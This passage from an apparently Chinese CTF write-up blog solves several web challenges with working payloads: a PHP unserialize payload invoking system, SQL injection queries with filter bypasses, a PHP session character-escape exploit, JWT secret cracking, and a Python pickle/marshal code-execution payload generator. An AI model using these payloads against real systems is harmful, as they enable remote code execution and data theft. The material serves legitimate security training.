class=&#34;hljs-variable&#34;&gt;$result&lt;/span&gt;;&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;    &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Test&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Y-m-d h:i:s a&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;date&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;func != &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; gettime(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;func, &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;p);&lt;br&gt;            &amp;#125;&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;func&amp;quot;&lt;/span&gt;];&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;];&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt; != &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;) &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt; = strtolower(&lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt;);&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!in_array(&lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt;,&lt;span class=&#34;hljs-variable&#34;&gt;$disable_fun&lt;/span&gt;)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; gettime(&lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Hacker...&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可以看到禁用了一些危险函数，但是里面有一个 Test 类，可以执行命令，而且 unserialize 没有被禁用，就可以构造反序列化来实现命令执行。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;payload： &lt;code&gt;func=unserialize&amp;amp;p=O:4:&amp;quot;Test&amp;quot;:2:&amp;#123;s:1:&amp;quot;p&amp;quot;;s:22:&amp;quot;cat /tmp/flagoefiu4r93&amp;quot;;s:4:&amp;quot;func&amp;quot;;s:6:&amp;quot;system&amp;quot;;&amp;#125;&lt;/code&gt;  拿到 flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;bjdctf2020cookie-is-so-stable&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bjdctf2020cookie-is-so-stable&#34;&gt;#&lt;/a&gt; [BJDCTF2020]Cookie is so stable&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;提示 cookie，发现在 flag 输入 id 后 cookie 有一个 user 字段存在模板注入，测试4显示 Hello 4&lt;/li&gt;
&lt;li&gt;发现存在过滤，过滤了: &lt;code&gt;()、&#39;&#39;、$&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;直接用 Twig 的 payload 直接 cat flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;swpu2019web1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#swpu2019web1&#34;&gt;#&lt;/a&gt; [SWPU2019]Web1&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;在广告名处有过滤，可能存在注入点&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;测试 &lt;code&gt;&#39;&lt;/code&gt;  然后点广告详情会包错，存在注入点&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;测试字段数，丧心病狂的有 22 个字段数。。。。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;空格用 &lt;code&gt;/**/&lt;/code&gt;  绕过，(select/**/version ()) 看到是 MariaDB&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.zeddyu.info/2019/03/06/Sqli%E5%A4%87%E5%BF%98%E5%BD%95/&#34;&gt;https://blog.zeddyu.info/2019/03/06/Sqli 备忘录 /&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;select distinct(table_name) from mysql.innodb_index_stats&lt;/code&gt;  拿到表名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;过滤了 or    无列名注入&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;select group_concat(b) from (select 1,2,3 as b union select * from users)a&lt;/code&gt;  拿 flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;安洵杯-2019easy_serialize_php&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#安洵杯-2019easy_serialize_php&#34;&gt;#&lt;/a&gt; [安洵杯 2019] easy_serialize_php&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;给出源码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt; &lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$function&lt;/span&gt; = @&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;f&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;filter&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$img&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$filter_arr&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;php&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;flag&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;php5&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;php4&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;fl1g&amp;#x27;&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$filter&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.implode(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;|&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-variable&#34;&gt;$filter_arr&lt;/span&gt;).&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/i&amp;#x27;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; preg_replace(&lt;span class=&#34;hljs-variable&#34;&gt;$filter&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-variable&#34;&gt;$img&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;)&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;unset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;user&amp;quot;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;guest&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;function&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-variable&#34;&gt;$function&lt;/span&gt;;&lt;br&gt;&lt;br&gt;extract(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;hljs-variable&#34;&gt;$function&lt;/span&gt;)&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;lt;a href=&amp;quot;index.php?f=highlight_file&amp;quot;&amp;gt;source_code&amp;lt;/a&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;img_path&amp;#x27;&lt;/span&gt;])&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;img&amp;#x27;&lt;/span&gt;] = base64_encode(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;guest_img.png&amp;#x27;&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;img&amp;#x27;&lt;/span&gt;] = sha1(base64_encode(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;img_path&amp;#x27;&lt;/span&gt;]));&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$serialize_info&lt;/span&gt; = filter(serialize(&lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;));&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$function&lt;/span&gt; == &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;highlight_file&amp;#x27;&lt;/span&gt;)&amp;#123;&lt;br&gt;    highlight_file(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;index.php&amp;#x27;&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$function&lt;/span&gt; == &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;phpinfo&amp;#x27;&lt;/span&gt;)&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;phpinfo();&amp;#x27;&lt;/span&gt;); &lt;span class=&#34;hljs-comment&#34;&gt;//maybe you can find something in here!&lt;/span&gt;&lt;br&gt;&amp;#125;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$function&lt;/span&gt; == &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;show_image&amp;#x27;&lt;/span&gt;)&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$userinfo&lt;/span&gt; = unserialize(&lt;span class=&#34;hljs-variable&#34;&gt;$serialize_info&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; file_get_contents(base64_decode(&lt;span class=&#34;hljs-variable&#34;&gt;$userinfo&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;img&amp;#x27;&lt;/span&gt;]));&lt;br&gt;&amp;#125; &lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;给出了 phpinfo 并且提示里面有内容，看到 &lt;code&gt;d0g3_f1ag.php&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;看到反序列化 session，盲猜应该是 session.upload_progress 的题目，然后 filter 函数应该是是利用字符逃逸&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;有一个 &lt;code&gt;extract($_POST);&lt;/code&gt; ，当我们 POST 一个_SESSION 变量之后，就会覆盖 SESSION，这里就是可控点&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;接下来就是如何字符逃逸。我们需要构造出来的 session 是&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;_SESSION&lt;/span&gt;[user]=&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;flagphpphpflagphp&lt;/span&gt;&amp;amp;_SESSION[exp]=;s:&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;img&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ZDBnM19mMWFnLnBocA==&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;exp&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&amp;amp;_SESSION[function]=flagflagflagflagflagflagflagflagphpphp&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;拿到 d0g3_f1ag.php 源码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$flag&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;flag in /d0g3_fllllllag&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;发现文件名经过 base64 编码后长度不变，改一下就好，拿到 flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;安洵杯-2019easy_serialize_php-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#安洵杯-2019easy_serialize_php-2&#34;&gt;#&lt;/a&gt; [安洵杯 2019] easy_serialize_php&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;提示找到 &amp;quot;lv6&amp;quot;，用脚本跑，在第 181 页&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;买不起，改折扣，提示 &lt;code&gt;b1g_m4mber&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;提示只能 admin 访问，有 JWT&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/brendan-rius/c-jwt-cracker&#34;&gt;https://github.com/brendan-rius/c-jwt-cracker&lt;/a&gt;  用这个工具跑   密钥是 &lt;code&gt;1Kun&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用 https://jwt.io/#encoded-jwt 修改，拿到修改后的 JWT，访问拿到提示 &lt;code&gt;/static/asd1f654e683wq/www.zip&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;源码中 Admin.py 有一个 pickle 触发点&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; marshal&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; base64&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; urllib&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;foo&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; commands&lt;br&gt;    output = commands.getstatusoutput(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cat /flag.txt&amp;#x27;&lt;/span&gt;)&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; output&lt;br&gt;&lt;br&gt;payload = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;ctypes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;FunctionType&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;(cmarshal&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;loads&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;(cbase64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;b64decode&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;(S&amp;#x27;%s&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;tRtRc__builtin__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;globals&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;(tRS&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;tR(tR.&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt; % base64.b64encode(marshal.dumps(foo.func_code))&lt;br&gt;&lt;br&gt;&lt;br&gt;payload = urllib.quote(payload)&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt; payload&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
